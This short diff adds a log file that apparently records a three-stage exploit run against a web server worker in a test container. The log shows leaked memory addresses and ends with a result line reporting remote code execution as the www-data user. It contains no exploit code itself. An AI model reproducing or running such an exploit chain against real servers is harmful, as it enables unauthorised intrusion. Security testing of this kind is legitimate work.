@@ -1,0 +1,8 @@
+[*] rotating worker over HTTP
+[*] stage 1 attempt 1
+[*] rotating worker over HTTP
+[*] stage 2 attempt 1
+[*] rotating worker over HTTP
+[*] stage 3: HTDATA=0x7faf022690d8 ZIF=0x7faf04339370
+RESULT {"container": "9bieaslr-8426-on-16M", "stages": {"stage1_attempts": 1, "stage1": "0x7faf02200000", "stage2_attempts": 1, "stage2": "0x7faf03ed4000", "stage3_attempts": 1}, "proof": "uid=33(www-data) gid=33(www-data) groups=33(www-data)", "result": "RCE"}
+exit=0
